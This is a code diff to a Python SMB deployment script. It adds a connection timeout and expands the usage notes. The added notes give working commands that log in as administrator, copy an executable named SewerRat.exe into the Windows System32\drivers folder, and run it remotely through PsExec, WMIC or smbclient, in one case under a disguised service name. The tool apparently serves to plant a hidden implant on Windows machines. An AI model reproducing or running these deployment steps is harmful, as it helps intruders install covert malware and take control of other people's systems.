@@ -108,7 +108,7 @@ class SMBDeployer:
         """Establish SMB connection to target"""
         logger.info(f"Connecting to {self.target_ip}...")
         try:
-            self.conn = SMBConnection(self.target_ip, self.target_ip, 445)
+            self.conn = SMBConnection(self.target_ip, self.target_ip, 445, timeout=60)
             self.conn.login(self.username, self.password, self.domain)
             logger.info("[+] SMB connection established")
             return True
@@ -292,6 +292,9 @@ r"""
 DEPLOYMENT WORKFLOW EXAMPLES
 =============================
 
+Example 0: Basic deployment as admin
+    python3 scripts/deploy.py -t 192.168.0.24 -u administrator -p 'YourPassword!' -d .
+
 Example 1: Basic deployment with RPC/SCMR service execution
     python3 deploy.py -t 10.0.0.5 -u administrator -p 'P@ssw0rd!' -s "Win32NetworkBuffer"
 
@@ -355,4 +358,10 @@ Manual fallback options:
   1. Copy file via SMB mount: net use Z: \\\\10.0.0.5\\c$ /user:admin
   2. Execute via PsExec: psexec.exe \\\\10.0.0.5 -u admin -p pass C:\\Windows\\System32\\drivers\\SewerRat.exe
   3. UNC path execution: wmic process call create "\\\\10.0.0.5\\c$\\Windows\\System32\\drivers\\SewerRat.exe"
+
+If deploy script is not working at all:
+
+smbclient -U administrator //192.168.0.24/C$
+smb: \> lcd dist
+smb: \> put SewerRat.exe Windows\System32\drivers\SewerRat.exe
 """
